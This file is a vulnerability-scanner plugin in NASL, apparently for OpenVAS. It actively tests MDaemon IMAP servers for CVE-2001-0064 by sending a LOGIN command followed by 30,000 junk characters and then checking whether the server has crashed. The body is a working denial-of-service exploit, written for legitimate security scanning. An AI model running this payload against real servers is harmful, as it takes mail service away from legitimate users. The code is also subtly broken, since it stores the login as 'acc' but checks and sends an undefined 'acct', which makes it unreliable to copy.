# SPDX-FileCopyrightText: 2004 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:altn:mdaemon";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14826");
  script_version("2025-05-06T05:40:10+0000");
  script_tag(name:"last_modification", value:"2025-05-06 05:40:10 +0000 (Tue, 06 May 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_cve_id("CVE-2001-0064");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("MDaemon IMAP Server DoS (CVE-2001-0064) - Active Check");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2004 David Maciejak");
  script_family("Denial of Service");
  script_dependencies("gb_altn_mdaemon_consolidation.nasl", "logins.nasl");
  script_require_ports("Services/imap", 143);
  script_mandatory_keys("altn/mdaemon/imap/detected", "imap/login", "imap/password");

  script_tag(name:"summary", value:"It is possible to crash the remote MDaemon IMAP server by
  sending a long argument to the 'LOGIN' command.");

  script_tag(name:"vuldetect", value:"Sends a crafted IMAP request and checks if the remote service
  is still available afterwards.");

  script_tag(name:"impact", value:"This problem allows an attacker to make the remote MDaemon
  server to crash, thus preventing legitimate users from receiving e-mails.");

  script_tag(name:"solution", value:"Update to the latest version.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/2134");

  exit(0);
}

include("host_details.inc");
include("imap_func.inc");

kb_creds = imap_get_kb_creds();
acc = kb_creds["login"];
pass = kb_creds["pass"];
if(!acct || !pass)
  exit(0);

if (!port = get_app_port(cpe: CPE, service: "imap"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

s = string("? LOGIN ", acct, " ", pass, " ", crap(30000), "\r\n");
send(socket:soc, data:s);
d = recv_line(socket:soc, length:4096);
close(soc);

soc2 = open_sock_tcp(port);
if(!soc2) {
  security_message(port:port);
  exit(0);
}

close(soc2);
exit(99);
